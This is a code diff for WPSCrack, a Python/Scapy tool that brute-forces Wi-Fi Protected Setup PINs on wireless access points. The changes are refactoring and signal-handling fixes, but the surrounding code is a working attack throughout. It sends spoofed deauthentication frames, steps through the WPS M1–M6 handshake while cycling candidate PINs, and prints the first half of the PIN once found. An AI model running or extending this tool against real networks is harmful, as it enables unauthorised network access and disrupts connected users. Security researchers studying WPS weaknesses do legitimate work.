@@ -9,6 +9,7 @@ import time, threading, hmac, hashlib, sys, optparse, random, socket, fcntl, ran
 from struct import pack, unpack
 from Crypto.Cipher import AES
 from scapy.all import *
+import signal
 
 class WPSCrack:
     verbose = None
@@ -162,10 +163,7 @@ class WPSCrack:
         / Raw(load='WFA-SimpleConfig-Registrar-1-0')
                             
         i = 0
-        while self.done == False:
-            if self.done == True:
-                break
-            
+        while not self.done:
             self.rcved_auth_response = False
             self.rcved_asso_response = False
             self.rcved_eap_request_identity = False
@@ -175,9 +173,10 @@ class WPSCrack:
             self.m4_sent = False
             
             i += 1
-            if self.verbose: print '------------------- attempt #%i' % i
-            timeout_timer = threading.Timer(self.timeout_time, self.timeout)
-            timeout_timer.start()
+            if self.verbose: 
+                print '------------------- attempt #%i' % i
+            self.timeout_timer = threading.Timer(self.timeout_time, self.timeout)
+            self.timeout_timer.start()
             self.has_auth_failed = False
             self.has_timeout = False
             self.has_retry = False
@@ -186,45 +185,52 @@ class WPSCrack:
                 
             self.send_deauth()
                         
-            if self.verbose: print '-> 802.11 authentication request'    
+            if self.verbose: 
+                print '-> 802.11 authentication request'    
             self.rcved.clear()
             sendp(authorization_request, verbose=0)
             self.rcved.wait()
             
-            if self.rcved_auth_response == True:
-                if self.verbose: print '-> 802.11 association request'
+            if self.rcved_auth_response:
+                if self.verbose: 
+                    print '-> 802.11 association request'
                 self.rcved.clear()
                 sendp(association_request, verbose=0)
                 self.rcved.wait()
                                     
-                if self.rcved_asso_response == True:
-                    if self.verbose: print '-> EAPOL start'
+                if self.rcved_asso_response:
+                    if self.verbose: 
+                        print '-> EAPOL start'
                     self.rcved.clear()
                     sendp(eapol_start, verbose=0)
                     self.rcved.wait()                        
                         
-                    if self.rcved_eap_request_identity == True:
-                        if self.verbose: print '-> EAP response identity'
+                    if self.rcved_eap_request_identity:
+                        if self.verbose: 
+                            print '-> EAP response identity'
                         response_identity[EAP].id = self.request_EAP_id
                         self.rcved.clear()
                         sendp(response_identity, verbose=0)
                         self.rcved.wait()
                         
-                        if self.rcved_m1 == True:
-                            if self.verbose: print '-> M2'
+                        if self.rcved_m1:
+                            if self.verbose: 
+                                print '-> M2'
                             self.rcved.clear()
                             self.send_M2()
                             self.rcved.wait()
                             
-                            if self.rcved_m3 == True:
-                                if self.verbose: print '-> M4'
+                            if self.rcved_m3:
+                                if self.verbose: 
+                                    print '-> M4'
                                 self.rcved.clear()
                                 self.send_M4()
                                 self.m4_sent = True
                                 self.rcved.wait()
                                 
-                                if self.rcved_m5 == True:
-                                    if self.verbose: print '-> M6'
+                                if self.rcved_m5:
+                                    if self.verbose: 
+                                        print '-> M6'
                                     self.rcved.clear()
                                     self.send_M6()
                                     self.rcved.wait()
@@ -232,8 +238,9 @@ class WPSCrack:
             self.send_deauth()
             time.sleep(0.05)
             self.rcved.clear()
-            timeout_timer.cancel()
-            if self.verbose: print 'attempt took %.3f seconds' % (time.time() - start_time)
+            self.timeout_timer.cancel()
+            if self.verbose: 
+                print 'attempt took %.3f seconds' % (time.time() - start_time)
             self.gen_pin()
     
     def bignum_pack(self, n, l):
@@ -432,7 +439,7 @@ class WPSCrack:
                 self.rcved_m3 = True
             elif message_type == 'M5':
                 # we could validate the data but it makes no sense
-                if self.got_fist_half is False:
+                if not self.got_fist_half:
                     print 'found first half:', self.pin[0:4]
                 self.got_fist_half = True
                 self.rcved_m5 = True
@@ -444,7 +451,7 @@ class WPSCrack:
                 self.dump_EAP_Expanded(x)
                 self.done = True
             elif message_type == 'WSC_NACK':
-                if self.m4_sent == True:
+                if self.m4_sent:
                     self.has_auth_failed = True
                     nack = [
                     [0xFF00, '\x00\x37\x2A'],
@@ -466,26 +473,28 @@ class WPSCrack:
                     / EAPOL(version=1, type=0, len=70) \
                     / EAP(code=2, type=254, id=self.request_EAP_id, len=70) \
                     / Raw(load=eap_expanded)
-                    if self.verbose: print '-> WCS_NACK'
+                    if self.verbose: 
+                        print '-> WCS_NACK'
                     sendp(m, verbose=0)
                 else:
                     print 'got NACK before M4 - something is wrong'
                     self.has_retry = True
             return
                 
-                
     def sniffer_filter(self, x):
-        if (self.done == True):
+        if self.done:
             return True
-        elif (self.rcved.is_set() is False):
+        elif not self.rcved.is_set():
             if x.haslayer(Dot11) and x[Dot11].addr1 == self.client_mac and x[Dot11].addr3 == self.bssid:
 
-                if x.haslayer(Dot11Auth) and x[Dot11Auth].status == 0:
-                    if self.verbose: print '<- 802.11 authentication response'
+                if x.haslayer(Dot11Auth) and not x[Dot11Auth].status:
+                    if self.verbose: 
+                        print '<- 802.11 authentication response'
                     self.rcved_auth_response = True
                     self.rcved.set()
-                elif x.haslayer(Dot11AssoResp) and x[Dot11AssoResp].status == 0:
-                    if self.verbose: print '<- 802.11 association response'
+                elif x.haslayer(Dot11AssoResp) and not x[Dot11AssoResp].status:
+                    if self.verbose: 
+                        print '<- 802.11 association response'
                     self.rcved_asso_response = True
                     self.rcved.set()
                 elif x.haslayer(EAP) and x[EAP].code == 1:
@@ -497,9 +506,9 @@ class WPSCrack:
                         self.parse_EAP_Expanded(disasm)
                         self.rcved.set()
                     elif x[EAP].type == 1:
-                        if self.verbose: print '<- EAP request identity'
-                        
-                        if self.rcved_eap_request_identity == False:
+                        if self.verbose: 
+                            print '<- EAP request identity'
+                        if not self.rcved_eap_request_identity:
                             self.rcved_eap_request_identity = True
                             self.rcved.set()
                     else:
@@ -523,15 +532,15 @@ class WPSCrack:
         self.has_timeout = True
         
     def should_continue(self):
-        if self.has_timeout == True or self.has_auth_failed == True or self.has_retry == True:
+        if self.has_timeout or self.has_auth_failed or self.has_retry:
             return False        
         else:
             return True
             
     def gen_pin(self):
-        if self.has_timeout == False and self.rcved_m3 == True:
-            if self.got_fist_half == True:
-                    pin_int = int(self.pin[0:7]) + 1
+        if not self.has_timeout and self.rcved_m3:
+            if self.got_fist_half:
+                pin_int = int(self.pin[0:7]) + 1
             else:
                 pin_int = int(self.pin[0:7]) + 1000
 
@@ -546,7 +555,8 @@ class WPSCrack:
             self.pin = '%07i%01i' % (pin_int, (10 - accum % 10) % 10)
         
     def send_deauth(self):
-        if self.verbose:  print '-> 802.11 deauthentication'
+        if self.verbose: 
+            print '-> 802.11 deauthentication'
         deauth = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=12L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L, ID=0) \
         / Dot11Deauth(reason=1)
         sendp(deauth, verbose=0)
@@ -587,7 +597,12 @@ class WPSCrack:
                 hexdump(e[1])
             else:
                 print 'Message ID 0x%X not found!' % e[0]
-                print e              
+                print e
+    
+    def abort(self, *args, **kwargs):
+        self.done = True
+        self.rcved.set()
+        
 
 def get_hw_addr(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -632,6 +647,8 @@ def main():
         wps.verbose = options.verbose
         wps.pin = options.start_pin
         
+        signal.signal(signal.SIGHUP, wps.abort)
+        signal.signal(signal.SIGINT, wps.abort)
         wps.run()
     else:
         print 'check arguments or use --help!'
